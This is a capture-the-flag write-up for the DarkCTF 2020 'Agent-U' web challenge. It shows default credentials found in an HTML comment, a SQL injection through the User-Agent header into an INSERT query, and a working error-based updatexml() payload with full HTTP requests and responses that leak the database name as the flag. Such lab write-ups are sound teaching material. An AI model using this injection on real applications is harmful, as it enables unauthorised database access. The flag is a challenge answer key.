# DarkCTF 2020 – Agent-U

* **Category:** web
* **Points:** 395

## Challenge

> Agent U stole a database from my company but I don't know which one. Can u help me to find it?
> 
> http://agent.darkarmy.xyz/
> 
> flag format darkCTF{databasename}

## Solution

Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the *User-Agent* string.

```html
<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="" name="form1" method="post">
<center>
<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>

<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
<input type="submit" name="submit" value="Submit" />
</center></form>
<font size="3" color="#FFFF00">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br>

</font>
</div>
</body>
</html>
```

Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.

```html
<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="" name="form1" method="post">
<center>
<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>

<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
<input type="submit" name="submit" value="Submit" />
</center></form>
<font size="3" color="#FFFF00">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 ></font><font color= "#0000ff" font size = 3 >Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</font><br><br><br><img src="vibes.png"  /><br>

</font>
</div>
</body>
</html>
```

The usage of `X-Forwarded-For: 127.0.0.1` doesn't alter the IP address.

The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. *SQL injection* is possible via User-Agent string.

```
POST / HTTP/1.1
Host: agent.darkarmy.xyz
User-Agent: '
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://agent.darkarmy.xyz
Connection: close
Referer: http://agent.darkarmy.xyz/
Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit


HTTP/1.1 200 OK
Date: Sat, 26 Sep 2020 08:54:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.33
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
cf-request-id: 056b386df800000f621202d200000001
Server: cloudflare
CF-RAY: 5d8bc35ccbb30f62-MXP
Content-Length: 989

<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="" name="form1" method="post">
<center>
<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>

<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
<input type="submit" name="submit" value="Submit" />
</center></form>
<font size="3" color="#FFFF00">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 ></font><font color= "#0000ff" font size = 3 >Your User Agent is: '</font><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x.x.x.x', 'admin')' at line 1<br><br><img src="vibes.png"  /><br>

</font>
</div>
</body>
</html>
```

So you have to leak the database name. The problem is that this query is an `INSERT` one, so you need to apply an appropriate approach. You can use an [error based approach via `Updatexml()`](https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/).

The correct payload is the following.

```sql
'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
```

```
POST / HTTP/1.1
Host: agent.darkarmy.xyz
User-Agent: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://agent.darkarmy.xyz
Connection: close
Referer: http://agent.darkarmy.xyz/
Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit


HTTP/1.1 200 OK
Date: Sat, 26 Sep 2020 09:29:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.33
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
cf-request-id: 056b57c35500000f7e720c8200000001
Server: cloudflare
CF-RAY: 5d8bf57eebb20f7e-MXP
Content-Length: 944

<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="" name="form1" method="post">
<center>
<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>

<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
<input type="submit" name="submit" value="Submit" />
</center></form>
<font size="3" color="#FFFF00">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 ></font><font color= "#0000ff" font size = 3 >Your User Agent is: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #</font><br>XPATH syntax error: '~ag3nt_u_1s_v3ry_t3l3nt3d'<br><br><img src="vibes.png"  /><br>

</font>
</div>
</body>
</html>
```

The flag is composed with the database name, so it is the following.

```
darkCTF{ag3nt_u_1s_v3ry_t3l3nt3d}
```